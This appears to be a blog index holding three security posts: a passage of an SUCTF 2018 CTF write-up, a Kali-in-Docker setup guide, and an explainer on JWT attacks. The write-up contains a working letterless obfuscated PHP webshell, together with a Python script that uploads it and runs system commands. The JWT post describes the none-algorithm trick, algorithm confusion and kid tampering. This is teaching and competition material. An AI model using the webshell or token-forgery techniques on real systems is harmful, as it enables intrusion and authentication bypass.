2 3 4 5 6 7 8 if($contents=file_get_contents($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;])){ $data=substr($contents,5); foreach ($black_char as $b) { if (stripos($data, $b) !== false){ die(\u0026#34;illegal char\u0026#34;); } } } 用burp intruder跑一遍，发现不在黑名单里的可打印字符有 $()[]_~=;. 共10个。\n跑的时候需注意Intruder=\u0026gt;payloads=\u0026gt;payload encoding 处需取消勾选，否则会因为字符编码而不能得到正确的白名单。\n跑的时候可以在Intruder=\u0026gt;options=\u0026gt;Grep-Match 中选择 flag illegal ，这样就可以快速看到那些字符是合法的了。\n接下来就是构造一个由 $()[]_~=;. 组成的webshell了，主要思路来自 一些不包含数字和字母的webshell 。\n构造出的最终结果如下：\n1 \u0026lt;?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_____=~得[$_];$______=~第[$_];$_______=~学[$_];$_=_.$__.$___.$____;$_=$$_;$__=$_____.$______.$______.$___.$_______.$____;$__($_[_]); 详细注释：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;?= $_=_==_;//1 $__=~一[$_];//G $___=~了[$_];//E $____=~端[$_];//T $_____=~得[$_];//A $______=~第[$_];//S $_______=~学[$_];//R $_=_.$__.$___.$____;//_GET $_=$$_;//$_GET $__=$_____.$______.$______.$___.$_______.$____;//ASSERT $__($_[_]);//ASSERT($_GET[_]); ------------------------------------------------------ http://web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php ?_=phpinfo(); 可以有一个更短更舒服的选择\n1 \u0026lt;?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_=_.$__.$___.$____;$_=$$_;$_[_]($_[__]); 详细注释：\n1 2 3 4 5 6 7 8 9 10 $_=_==_;//1 $__=~一[$_];//G $___=~了[$_];//E $____=~端[$_];//T $_=_.$__.$___.$____;//_GET $_=$$_;//$_GET $_[_]($_[__]);//$_GET[_]($_GET[__]); ------------------------------------------------------ http://web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php ?_=assert\u0026amp;__=phpinfo(); 读取flag\n1 2 3 4 5 view-source:http://web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php?_=assert\u0026amp;__=system(%22ls%20-l%20/%22); http://web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php?_=assert\u0026amp;__=readfile(%27/Th1s_14_f14g%27); SUCTF{KyGeBLWoF9MXcdDKBdbw2B54sMxbsxyXBpm8t5nQUHBJKuAYEd6o} 上传小脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #coding:utf8 import requests import re data=\u0026#34;\u0026lt;?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_=_.$__.$___.$____;$_=$$_;$_[_]($_[__]);\u0026#34; base=\u0026#34;http://web.suctf.asuri.org:82/\u0026#34; files = {\u0026#39;file\u0026#39;: (\u0026#39;findneo.php\u0026#39;, data, \u0026#39;image/jpeg\u0026#39;)} content = requests.post(base+\u0026#34;upload.php\u0026#34;, files=files).text cmd=\u0026#39;system(\u0026#34;dir /\u0026#34;);\u0026#39; payload=base+re.match(\u0026#34;[\\s\\S]*Stored in: ([a-z.0-9/]+)[\\s\\S]*\u0026#34;,content).group(1)+\u0026#34;?_=assert\u0026amp;__=\u0026#34;+cmd print payload print requests.get(payload).content # http://web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php?_=assert\u0026amp;__=system(\u0026#34;dir /\u0026#34;); # 1Th1s_14_f14g boot etc lib\tmedia\topt root sbin sys usr # bin\tdev home lib64 mnt\tproc run srv tmp var 写了一个用上述方法生成任意字母构成的字符串的小程序：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # coding: UTF-8 # Author: \u0026#39;findneo\u0026#39; # compose php code from limited whitelist: $()[]_~=;. def gendict(index=\u0026#39;_==_\u0026#39;,target_chars=[chr(i) for i in range(0x20,0x7f)]): sentence=\u0026#34;如是我闻。一时薄伽梵。住王舍城鹫峰山顶。与大苾刍众千二百五十人俱。皆阿罗汉。诸漏已尽无复烦恼得真自在心善解脱慧善解脱。如调慧马亦如大龙。已作所作已办所办。弃诸重担逮得己利。尽诸有结正知解脱。至心自在第一究竟。除阿难陀独居学地得预流果。大迦叶波而为上首。复有五百苾刍尼众。皆阿罗汉。大胜生主而为上首。复有无量邬波索迦、邬波斯迦。皆见圣谛。复有无量无数菩萨摩诃萨众。一切皆得陀罗尼门三摩地门。住空无相无分别愿。已得诸法平等性忍。具足成就四无碍解。凡所演说辩才无尽。于五神通自在游戏。所证智断永无退失。言行威肃闻皆敬受。勇猛精进离诸懈怠。能舍亲财不顾身命。离矫离诳无染无求。等为有情而宣正法。契深法忍穷最极趣。得无所畏其心泰然。超众魔境出诸业障。摧灭一切烦恼怨敌。建正法幢伏诸邪论。声闻独觉不能测量。得心自在得法自在。业惑见障皆已解脱。择法辩说无不善巧。入深缘起生灭法门。离见随眠舍诸缠结。智慧通达诸圣谛理。曾无数劫发弘誓愿。容貌熙怡先言接引。远离颦蹙辞韵清和。赞颂善巧辩才无滞。处无边众威德肃然。抑扬自在都无所畏。多俱胝劫巧说无尽。于诸法门胜解观察。如幻如阳焰。如梦如水月。如响如空花。如像如光影。如变化事。如寻香城。虽皆无实而现似有。离下劣心说法无畏。能随证入无量法门。善知有情心行所趣。以微妙慧而度脱之。于诸有情心无挂碍。成就最上无生法忍。善入诸法平等性智。甚深法性能如实知。随其所应巧令悟入。能善宣说缘起法门。摄受无边佛国大愿。于十方界无数诸佛。等持正念常现在前。诸佛出世皆能历事。亦能劝请转正法轮。不般涅槃度无量众善能伏灭一切有情种种见缠诸烦恼焰。须臾游戏百千等持。引发无边殊胜功德。此诸菩萨具如是等妙功德海。设经无量俱胝大劫。叹不能尽。其名曰贤守菩萨摩诃萨。宝性菩萨摩诃萨。宝藏菩萨摩诃萨。宝授菩萨摩诃萨。导师菩萨摩诃萨。仁授菩萨摩诃萨。星授菩萨摩诃萨。神授菩萨摩诃萨。帝授菩萨摩诃萨。广慧菩萨摩诃萨。胜慧菩萨摩诃萨。上慧菩萨摩诃萨。增长慧菩萨摩诃萨。无边慧菩萨摩诃萨。不虚见菩萨摩诃萨。无障慧菩萨摩诃萨。善发趣菩萨摩诃萨。善勇猛菩萨摩诃萨。极精进菩萨摩诃萨。常精进菩萨摩诃萨。常加行菩萨摩诃萨。不舍轭菩萨摩诃萨。日藏菩萨摩诃萨。月藏菩萨摩诃萨。无比慧菩萨摩诃萨。观自在菩萨摩诃萨。得大势菩萨摩诃萨。妙吉祥菩萨摩诃萨。宝印手菩萨摩诃萨。摧魔力菩萨摩诃萨。金刚慧菩萨摩诃萨。金刚藏菩萨摩诃萨。常举手菩萨摩诃萨。大悲心菩萨摩诃萨。大庄严菩萨摩诃萨。庄严王菩萨摩诃萨。山峰菩萨摩诃萨。宝峰菩萨摩诃萨。德王菩萨摩诃萨。慈氏菩萨摩诃萨。如是等无量百千俱胝那庾多菩萨摩诃萨。皆法王子堪绍佛位而为上首。尔时世尊于师子座上。自敷尼师坛结跏趺坐。端身正愿住对面念。入等持王妙三摩地。诸三摩地皆摄入此三摩地中。是所流故。尔时世尊正知正念。从等持王安庠而起。以净天眼观察十方殑伽沙等诸佛世界。举身怡悦。从两足下千辐轮相。各放六十百千俱胝那庾多光。从足十指。两趺两跟。四踝两胫。两腨两膝。两股。腰胁腹背。脐中心上胸臆德字。两乳两腋。两肩两髆。两肘两臂。两腕两手。两掌十指。项咽颐颔。颊额头顶两眉两眼。两耳两鼻。口四牙。四十齿。眉间毫相。一一身分。各放六十百千俱胝那庾多光。此一一光各照三千大千世界。从此展转遍照十方殑伽沙等诸佛世界。其中有情遇斯光者。必得无上正等菩提。尔时世尊一切毛孔皆悉熙怡。各出六十百千俱胝那庾多光。是一一光各照三千大千世界。从此展转遍照十方殑伽沙等诸佛世界。其中有情遇斯光者。必得无上正等菩提。尔时世尊演身常光照此三千大千世界。从此展转遍照十方殑伽沙等诸佛国土。其中有情遇斯光者。必得无上正等菩提。尔时世尊从其面门出广长舌相。遍覆三千大千世界。熙怡微笑。复从舌相流出无量百千俱胝那庾多光。其光杂色。从此杂色一一光中。现宝莲花。其花千叶皆真金色。众宝庄严。绮饰鲜荣。甚可爱乐。香气芬烈。周流普熏。细滑轻软。触生妙乐。诸花台中皆有化佛结跏趺坐。演妙法音。一一法音。皆说般若波罗蜜多相应之法。有情闻者必得无上正等菩提。从此展转。流遍十方殑伽沙等诸佛世界。说法利益亦复如是。\u0026#34; parse_byte=lambda c:[~i%256 for i in bytes(c, encoding=\u0026#39;utf-8\u0026#39;)][1] d=dict() for k in sentence: j=parse_byte(k) if chr(j) in target_chars and chr(j) not in d.keys(): d[chr(j)]=\u0026#34;~{}[{}]\u0026#34;.format(k,index) return d def gencode(code): d=gendict(index=\u0026#39;$_\u0026#39;,target_chars=\u0026#39;\u0026#39;.join(set(code))) res=\u0026#39;$__=\u0026#39;+\u0026#39;.\u0026#39;.join(map(lambda x:d[x],code)) return res code=\u0026#39;@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\u0026#39; print(gencode(code)) # \u0026lt;?php # $_=_==_; # $__=~俱[$_].~得[$_].~住[$_].~伽[$_].~结[$_].~二[$_].~鹫[$_].~一[$_].~已[$_].~足[$_].~流[$_].~索[$_].~峰[$_].~精[$_].~山[$_].~尽[$_].~诸[$_].~宣[$_].~正[$_].~第[$_].~竟[$_].~誓[$_].~马[$_].~言[$_].~解[$_].~如[$_].~神[$_].~大[$_].~声[$_].~梵[$_].~顶[$_].~堪[$_].~城[$_].~果[$_].~坛[$_].~真[$_].~相[$_].~皆[$_].~百[$_].~是[$_].~闻[$_].~薄[$_].~数[$_].~生[$_].~响[$_].~和[$_].~摩[$_].~萨[$_].~叶[$_].~王[$_].~千[$_].~猛[$_].~苾[$_].~办[$_].~所[$_].~我[$_].~自[$_].~熙[$_].~慧[$_].~脱[$_].~烦[$_].~邬[$_].~恼[$_]; # var_dump($__); # // string(63) \u0026#34;@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\u0026#34; CRYPTO Magic 把magic视为256x256的由0，1组成的矩阵M，把cipher视为256x1的矩阵C，把key视为256x1的矩阵K，已知M,C，且M*K = C (.mod 2)，求K。\n可以采用Gauss-Jordan 消元法 将增广矩阵[M|C] 简化为行阶梯形矩阵，那么变化后的C就是我们的解K。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 read_to_int_array = lambda x:[map(int,list(bin(int(line,16))[2:].zfill(256))) for line in open(x).readlines()] cipher = read_to_int_array(\u0026#39;cipher.txt\u0026#39;)[0] magic = read_to_int_array(\u0026#39;magic.txt\u0026#39;) dim=len(cipher) for col in range(dim): for row in range(col,dim): if magic[row][col]==1: magic[col],magic[row]=magic[row],magic[col] cipher[col],cipher[row]=cipher[row],cipher[col] break for row in range(dim): if magic[row][col]==1 and row!=col: for each_in_row in range(dim): magic[row][each_in_row]^=magic[col][each_in_row] cipher[row]^=cipher[col] print \u0026#34;flag{%s}\u0026#34;%hex(int(\u0026#39;\u0026#39;.join(map(str,cipher)),2))[2:-1].decode(\u0026#39;hex\u0026#39;) #flag{Now_you_know_the_Hill_Cipher_xwg} 参考链接：\nhttps://blog.csdn.net/u010182633/article/details/45225179 https://github.com/0h2o/docs/tree/gh-pages/WriteUps/SUCTF2018/CNSS_SUCTF_WRITEUP 也可尝试借助matlab的 rref 。 题目备份 https://github.com/findneo/ctfgodown/tree/master/20180527-suctf\n","permalink":"https://ret2neo.cn/post/180527suctf/","summary":"MISC sandgame game.py\n1 2 3 4 5 6 7 8 import flag flag = flag.flag sands = int(flag[5:-1].encode(\u0026#34;hex\u0026#34;), 16) holes = [257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373] with open(\u0026#34;sand.txt\u0026#34;, \u0026#34;w\u0026#34;) as f: for i in range(len(holes)): sand = sands % holes[i] f.write(str(sand)+\u0026#34;\\n\u0026#34;) solution.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #coding:utf8 # import flag # 解同余方程组；中国剩余定理，韩信点兵，扩展欧几里得，模反 \u0026lt;= 深入理解 #求模反元素，模逆元 def gcd(a,b): while a!","title":"suctf writeup"},{"content":"全程需保证保证网络畅通\n安装Docker 从 https://docs.docker.com/toolbox/toolbox_install_windows/ 下载DockerToolbox.exe 。关闭其他程序，右键管理员运行，选项可全部保持默认（如果电脑上未安装Git，在安装过程中需注意勾选）。\n桌面可看到名为``Docker Quickstart Terminal`的快捷方式，右键管理员运行，等待直到出现可交互命令行。\n修改默认存储位置到非系统盘 在上一步出现的可交互命令行界面运行 docker-machine.exe stop default 关闭基础虚拟机。\n运行桌面上名为Oracle VM VirtualBox 的快捷方式。\n在管理-\u0026gt;虚拟介质管理器【CTRL+D】 中复制disk.vmdk 到D盘 ，注意最好保持vmdk 格式。 选中default 虚拟机，右键设置-\u0026gt;存储-\u0026gt;控制器：SATA-\u0026gt;添加虚拟硬盘 中添加D盘的disk.vmdk 。删除C盘的disk.vmdk 。保存设置。 回到 命令行，运行docker-machine.exe start default 启动基础虚拟机。\n下载Kali基础镜像并配置容器 （以下命令均在上述命令行中输入）\ndocker pull kalilinux/kali-linux-docker 拉取Kali基础镜像，约700+M。\ndocker run -it --name kali kalilinux/kali-linux-docker /bin/bash 基于该镜像启动一个容器并命名为kali 。\napt update \u0026amp;\u0026amp; apt full-upgrade \u0026amp;\u0026amp; apt auto-remove \u0026amp;\u0026amp; apt-autoclean 安装工具前的准备工作。此处是一小段等待。\napt install kali-linux-all 安装Kali的工具包。此处是漫长等待。 如果报错按错误提示操作即可。\n配置msf数据库 service postgresql start su postgres\ncreateuser username -P 设置数据库用户账户密码\ncreatedb --owner=username dbname \u0026amp;\u0026amp; exit 创建数据库\ncd /usr/share/metasploit-framework/config \u0026amp;\u0026amp; cp database.yml.example database.yml \u0026amp;\u0026amp; vi database.yml 填好username,pass,dbname 。\nmsfconsole\ndb_status 查看数据库连接状态 db_connect username:password@localhost/dbname //若没成功连接数据库，则手动连接 常用基本操作 数据管理 文件传输 docker cp kali:/root/testfile testfile docker cp test kali:/root/test 数据卷 docker volume create my-vol docker volume ls docker run --mount source=my-vol,target=/webapp ... 对应目录是default虚拟机的/var/lib/docker/volumes/my-vol ，并不能直接操作，理论上应该先在虚拟机和主机间共享文件夹，然后再使用数据卷。 挂载主机目录 docker run --mount type=bind,source=/src/webapp,target=/opt/webapp ... 对镜像(image)的操作 docker search kali 在线搜索镜像。\ndocker pull kalilinux/kali-linux-docker 下载镜像。\ndocker image ls [-a] 列出本地镜像。\ndocker image rm kalilinux/kali-linux-docker 删除本地镜像。\ndocker commit -a findneo -m \u0026quot;kali-all-tools installed;msfdb configured\u0026quot; kali findneo/kali:v1 生成镜像\n保存与加载本地镜像\n1 2 3 4 5 6 7 $ docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE findneo/kali v1 16b856910432 About an hour ago 13.2GB kalilinux/kali-linux-docker latest b8fe82f15421 2 months ago 749MB docker save -o D:\\findneoandOriginKali.tar findneo/kali:v1 kalilinux/kali-linux-docker docker load -i D:\\findneoandOriginKali.tar 对容器(container)的操作 docker run --rm kalilinux/kali-linux-docker /bin/echo \u0026quot;hi\u0026quot;\n以kalilinux/kali-linux-docker 镜像为基础启动一个新的容器，执行命令/bin/echo \u0026quot;hi\u0026quot; ，退出、终止并删除容器。\ndocker run -it --name kali kalilinux/kali-linux-docker /bin/bash\n以kalilinux/kali-linux-docker 镜像为基础启动一个新的容器，命名为kali ，提供bash终端 。执行exit 将退出、终止但保留容器。\ndocker start kali 启动名为kali 的容器并在后台运行，相当于开机 。 docker exec -it kali bash 进入kali 的bash终端。执行exit 将退出但不终止容器。 docker stop kali 终止名为kali 的容器，相当于关机 。\ndocker container ls -a 列出所有容器，不带-a 参数仅列出当前运行中的容器。 docker container rm kali 删除指定容器。若容器正在运行需加--force 参数。\ndocker container export -o D:\\mykaliv1.tar kali 导出容器，相当于拍摄快照 。 docker import D:\\mykaliv1.tar- test/kali:v1 导入容器，相当于还原快照 。\n扩容 参考：https://stackoverflow.com/questions/11659005/how-to-resize-a-virtualbox-vmdk-file 扩容磁盘 1 2 3 4 5 6 7 8 关闭容器和default虚拟机 docker stop kali docker-machine srop 扩容磁盘 cd C:\\Program Files\\Oracle\\VirtualBox VBoxManage clonehd \u0026#34;D:\\vmac\\dockerMachine\\disk.vmdk\u0026#34; \u0026#34;D:\\vmac\\dockerMachine\\cloned.vdi\u0026#34; --format vdi VBoxManage modifyhd \u0026#34;D:\\vmac\\dockerMachine\\cloned.vdi\u0026#34; --resize 204800 VBoxManage clonehd \u0026#34;D:\\vmac\\dockerMachine\\cloned.vdi\u0026#34; \u0026#34;D:\\vmac\\dockerMachine\\resized.vmdk\u0026#34; --format vmdk 调整分区 从 https://gparted.sourceforge.io/download.php 下载gparted-live-0.31.0-1-amd64.iso。 在default虚拟机设置面板的存储-\u0026gt;控制器-\u0026gt;添加虚拟光驱 中将gparted-live-0.31.0-1-amd64.iso 加到SATA0端口，使其开机第一个启动。移除原有磁盘，将扩容后的磁盘放在原来磁盘的位置。 启动-\u0026gt;无界面启动 ，使用GParted 调整磁盘空间。Apply。双击桌面EXIT ，选择shutdown退出，按右CTRL键使焦点回到主机 恢复虚拟机存储设置至下入状态 查看调整分区是否成功 docker-machine start default\ndocker-machine ssh default 进入default虚拟机的shell，去看看分区扩容是否成功\n查看并记录当前状态\nfdisk -l df -h cat /etc/fstab (/boot/grub/menu.lst文件没找到) 对比前后状态可以看到已经成功了 Partition table entries are not in disk order fdisk -l 出现Partition table entries are not in disk order 问题。字面上看是分区表和硬盘分区不一致。查资料据说不影响，不过还是试着解决下。\n参考链接 https://ubuntuforums.org/showthread.php?t=1252662 https://blog.csdn.net/wujiangguizhen/article/details/22857667 操作步骤 docker-machine ssh default sudo -i 切换到root权限 (https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password) fdisk /dev/sda x 进入专家模式 f fix partition order w 写入变化 解决后分区状态如下。对比上图可以发现sda1和sda2互换了。 图形界面 参考链接：\n【微信分享】林帆：Docker运行GUI软件的方法 shell中获取本机ip地址 How can I export DISPLAY from a Linux terminal to a Windows PC? docker学习8\u0026ndash;同主机下容器通信 What is the $DISPLAY environment variable? Docker for GUI-based environments? Can you run GUI apps in a docker container? 大致理解Docker网络结构和XX转发流程\n启动一个新配制参数的容器，将主机上X11的unix套接字共享到kali容器里面\n1 docker run -it -v /etc/localtime:/etc/localtime:ro -v /tmp/.X11-unix:/tmp/.X11-unix -e DISPLAY=\u0026#34;192.168.233.101:0.0\u0026#34; -e GDK_SCALE -e GDK_DPI_SCALE --name gkali findneo/kali:v1 bash 在Setting-\u0026gt;Configuration 里取消MobaXterm的X server的访问控制。\n启动容器即可使用GUI。可以使用xcal,xclock,xedit,xmessage,xeyes,xmessage 等等小程序测试X11转发是否正常工作（ls /usr/bin/x* 可以看到更多）\nSSH 连入 从容器访问主机可以直接使用主机的IP地址（ipconfig），从主机访问容器实际上是访问boot2docker 虚拟机的IP （docker-machine.exe ssh default \u0026quot;/sbin/ifconfig eth1|sed -n '/inet addr/s/^[^:]*:\\([0-9.]\\{7,15\\}\\) .*/\\1/p'\u0026quot;）和启动容器时配置的转发端口 （docker run -p 12345:22 ... ）。\n1 2 所以理论上这样启动一个容器既可以SSH连入，又可以使用图形界面。 docker run -it -v /etc/localtime:/etc/localtime:ro -v /tmp/.X11-unix:/tmp/.X11-unix -e DISPLAY=\u0026#34;192.168.233.101:0.0\u0026#34; -e GDK_SCALE -e GDK_DPI_SCALE -p 52023:22 --name kali findneo/kali:v2 参考链接 https://yeasy.gitbooks.io/docker_practice/content/ https://blogs.technet.microsoft.com/positivesecurity/2017/09/01/setting-up-kali-linux-in-docker-on-windows-10/ https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password https://ubuntuforums.org/showthread.php?t=1252662 https://blog.csdn.net/wujiangguizhen/article/details/22857667 https://stackoverflow.com/questions/11659005/how-to-resize-a-virtualbox-vmdk-file 容器不应该是长久性的东西，要保持容器的可抛弃性，有问题就应该rm掉，数据保存在容器外，然后直接run新的容器。 ——http://www.talkwithtrend.com/Question/233635\n看到上面这个，感觉自己的用法可能有点奇怪：）\n","permalink":"https://ret2neo.cn/post/180512kaliondocker/","summary":"全程需保证保证网络畅通\n安装Docker 从 https://docs.docker.com/toolbox/toolbox_install_windows/ 下载DockerToolbox.exe 。关闭其他程序，右键管理员运行，选项可全部保持默认（如果电脑上未安装Git，在安装过程中需注意勾选）。\n桌面可看到名为``Docker Quickstart Terminal`的快捷方式，右键管理员运行，等待直到出现可交互命令行。\n修改默认存储位置到非系统盘 在上一步出现的可交互命令行界面运行 docker-machine.exe stop default 关闭基础虚拟机。\n运行桌面上名为Oracle VM VirtualBox 的快捷方式。\n在管理-\u0026gt;虚拟介质管理器【CTRL+D】 中复制disk.vmdk 到D盘 ，注意最好保持vmdk 格式。 选中default 虚拟机，右键设置-\u0026gt;存储-\u0026gt;控制器：SATA-\u0026gt;添加虚拟硬盘 中添加D盘的disk.vmdk 。删除C盘的disk.vmdk 。保存设置。 回到 命令行，运行docker-machine.exe start default 启动基础虚拟机。\n下载Kali基础镜像并配置容器 （以下命令均在上述命令行中输入）\ndocker pull kalilinux/kali-linux-docker 拉取Kali基础镜像，约700+M。\ndocker run -it --name kali kalilinux/kali-linux-docker /bin/bash 基于该镜像启动一个容器并命名为kali 。\napt update \u0026amp;\u0026amp; apt full-upgrade \u0026amp;\u0026amp; apt auto-remove \u0026amp;\u0026amp; apt-autoclean 安装工具前的准备工作。此处是一小段等待。\napt install kali-linux-all 安装Kali的工具包。此处是漫长等待。 如果报错按错误提示操作即可。\n配置msf数据库 service postgresql start su postgres","title":"在win10家庭版上的Docker中使用Kali"},{"content":"本文首发 Freebuf 。略有更新。\n0x01 初识JWT JWT （ JSON Web Token 的缩写）是一串带有声明信息的字符串，由服务端用加密算法对信息签名来保证其完整性和不可伪造。Token里可以包含所有必要信息，这样服务端就无需保存任何关于用户或会话的信息，JWT可用于身份认证、会话状态维持、信息交换等。\nJWT 由三部分构成，分别称为 header 、payload 和 signature ，各部分用. 相连构成一个完整的Token，形如xxxxx.yyyyy.zzzzz 。\n分别看下各个部分：\nheader ：\n使用一个JSON格式字符串声明token的类型和签名用的算法等，形如{\u0026quot;alg\u0026quot;: \u0026quot;HS256\u0026quot;, \u0026quot;typ\u0026quot;: \u0026quot;JWT\u0026quot;} 。该字符串经过Base64Url编码后形成JWT的第一部分xxxxx。\nBase64Url编码可以用这段代码直观理解：\n1 2 3 4 5 6 7 8 9 10 from base64 import * def base64URLen(s): t0=b64encode(s) t1=t0.strip(\u0026#39;=\u0026#39;).replace(\u0026#39;+\u0026#39;,\u0026#39;-\u0026#39;).replace(\u0026#39;/\u0026#39;,\u0026#39;_\u0026#39;) return t1 def base64URLde(s): t0=s.replace(\u0026#39;-\u0026#39;,\u0026#39;+\u0026#39;).replace(\u0026#39;_\u0026#39;,\u0026#39;/\u0026#39;) t1=t0+\u0026#39;=\u0026#39;*(4-len(t0)%4)%4 return b64decode(t1) payload :\n使用一个JSON格式字符串描述所要声明的信息，分为 registered 、 public 、 和 private 三类，形如{\u0026quot;name\u0026quot;: \u0026quot;John Doe\u0026quot;, \u0026quot;admin\u0026quot;: true} ，具体信息可参考 RFC7519 的 JWT claims 部分。\n同样的，该字符串经过Base64Url编码形成JWT的第二部分yyyyy。\nsignature :\n将 xxxxx.yyyyy 使用alg 指定的算法加密，然后再Base64Url编码得到JWT的第三部分zzzzz 。所支持的算法 类型取决于实现，但HS256 和 none 是强制要求实现的。\n0x02 简单应用 在本地运行起简单的基于Express的可发放和处理JWT的服务。\n**安装Node.js。**Node.js是JavaScript运行时环境，采用轻量高效的事件驱动、无阻塞I/O模型，拥有最大的开源库生态nmp。 1 2 Windows平台可在 https://nodejs.org/en/download/ 下载安装包 *nix 平台可根据 https://nodejs.org/en/download/package-manager/ 提示使用包管理器安装 安装Express，一款基于Node.js的快速、灵活、极简的Web框架。 1 2 3 4 5 # http://expressjs.com/en/starter/installing.html mkdir D:\\myapp \u0026amp;\u0026amp; cd D:\\myapp （全部回车，保持默认配置） npm init npm install express --save 运行本地服务 新建 index.js ，内容如下\n1 2 3 4 const express = require(\u0026#39;express\u0026#39;) const app = express() app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; res.send(\u0026#39;Hello World!\u0026#39;)) app.listen(3000, () =\u0026gt; console.log(\u0026#39;Example app listening on port 3000!\u0026#39;)) 运行node index.js ，就可从本地访问 http://localhost:3000 。\n安装必要模块： 适用于Node.js的JWT编解码模块 node-jwt-simple 和 cookie解析模块 cookie-parser 1 2 3 # https://github.com/hokaccha/node-jwt-simple npm install jwt-simple npm install cookie-parser 一个简单的本地demo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 //index.js //http://expressjs.com/en/4x/api.html //https://github.com/hokaccha/node-jwt-simple //一些初始化的工作 const express = require(\u0026#39;express\u0026#39;) var jwt = require(\u0026#39;jwt-simple\u0026#39;) var cookieParser = require(\u0026#39;cookie-parser\u0026#39;) var jwt_secret = \u0026#34;this is a secret for jwt\u0026#34; const app = express() app.use(cookieParser()) app.get(\u0026#39;/\u0026#39;,(req,res)=\u0026gt;res.redirect(\u0026#39;/help\u0026#39;)) app.get(\u0026#39;/help\u0026#39;, (req, res) =\u0026gt; { var RequstedURL=req.protocol+\u0026#39;://\u0026#39;+req.get(\u0026#39;Host\u0026#39;) res.send([ \u0026#39;GET \u0026#39;+RequstedURL+\u0026#39;/login?user=name\u0026amp;pass=passwd to get your JSON Web Token \u0026#39; , \u0026#39;GET \u0026#39;+RequstedURL+\u0026#39;/whoami to identify yourself\u0026#39; ].join(\u0026#39;\u0026lt;br\u0026gt;\u0026#39;)) }) app.get(\u0026#39;/login\u0026#39;,(req,res)=\u0026gt;{ var users={ \u0026#34;admin\u0026#34;:\u0026#34;admin_password_is_hard_to_guess\u0026#34;, \u0026#34;test\u0026#34;:\u0026#34;test123\u0026#34; } var payload = {\u0026#34;name\u0026#34;:req.query.user} if(users[req.query.user]===req.query.pass){ res.cookie(\u0026#39;jwt\u0026#39;,jwt.encode(payload,jwt_secret)) res.send(req.query.user +\u0026#39; logged in\u0026#39;) } else{res.send(\u0026#39;login failed!\u0026#39;)} }) app.get(\u0026#39;/whoami\u0026#39;,(req,res)=\u0026gt;{ try {res.send(\u0026#34;you are logged in as :\u0026lt;br\u0026gt;\u0026#34; +jwt.decode(req.cookies.jwt,jwt_secret)[\u0026#39;name\u0026#39;])} catch(err) {res.send(\u0026#34;your JWT is :\u0026lt;br\u0026gt;\u0026#34;+req.cookies.jwt)} }) app.listen(3000, () =\u0026gt; { console.log(\u0026#39;Example app listening on port 3000!\u0026#39;); console.log(\u0026#39;Example app listening on port 3000!\u0026#39;) }) 推荐几个在线工具 https://jwt.io by Sjoerd Langkemper 支持 hs256 算法 支持 rs256 算法 by Kenji Urushima 支持更多算法 kjur/jsjws 0x03 攻击面 发现敏感信息 JWT中的header 和 payload 虽然看起来不可读，但实际上都只经过简单编码，开发者可能误将敏感信息存储在里面。使用上述工具可以方便地解码JWT中前两部分的信息。\n指定算法为none 上面提到算法 none 是JWT规范中强制要求实现的，但有些实现JWT的库直接将使用none 算法的token视为已经过校验。这样攻击者就可以设置alg 为none ，使signature 部分为空，然后构造包含任意payload 的JWT来欺骗服务端。\n将签名算法从非对称类型改为对称类型 使用非对称加密算法（主要基于RSA、ECDSA，如S256）分发JWT的过程是使用私钥（private）加密生成JWT，使用公钥（public）解密验证。\n使用对称加密算法（主要基于HMAC，如HS256）分发JWT的过程是使用同一个密钥（secret）生成和验证JWT。\n如果服务端期待收到的算法类型为RS256，然后以RS256和public去验证JWT，而实际上收到的算法类型是HS256，那么服务端就可能尝试把public当作secret，然后用HS256算法解密验证JWT。\n由于RS256的public人人都可获得，攻击者可以预先以public为密钥，用HS256算法伪造包含任意payload 的JWT，从而成功通过服务端的验证。\n爆破密钥 JWT的安全性依赖于密钥的保密性，任何拥有密钥的人都可以构造任何内容的合法token。\n当一个JSON Web Token 被分发出去，如果密钥不够强壮就存在被爆破的风险，而且整个爆破过程可以离线进行。\n已经有人写了一些工具，推荐如下：\njwtbrute Sjord\u0026rsquo; python script John the Ripper 伪造密钥 有时JWT采用header 中的kid 字段关联校验算法的密钥，这个密钥可能是对称加密的密钥，也可能是非对称加密的公钥。如果能够猜测kid 和 密钥的关联性，攻击者就可能修改kid 来欺骗服务端，使其校验时使用攻击者可控的密钥，于是攻击者就可以伪造任意内容的可通过校验的JWT。\n2017 HITB Pasty 关联性：kid是密钥URI的一部分。\n2018强网杯 easyweb 关联性：kid 带入数据库查询对应密钥，可联合查询或者盲注。\n详见 http://findneo.github.io/180430ciscn/#easyweb\n0x04 安全建议 验证函数应忽略JWT中的algo 字段，预先就明确JWT使用的算法，如果需要使用多种算法，可以在header 中使用表示\u0026quot;key ID\u0026quot; 的kid 字段，查询每个kid 对应的算法。 JWT/JWS 标准应该移除 header 中的algo 字段。JWT的许多安全缺陷都来自于开发者依赖这一客户端可控的字段。 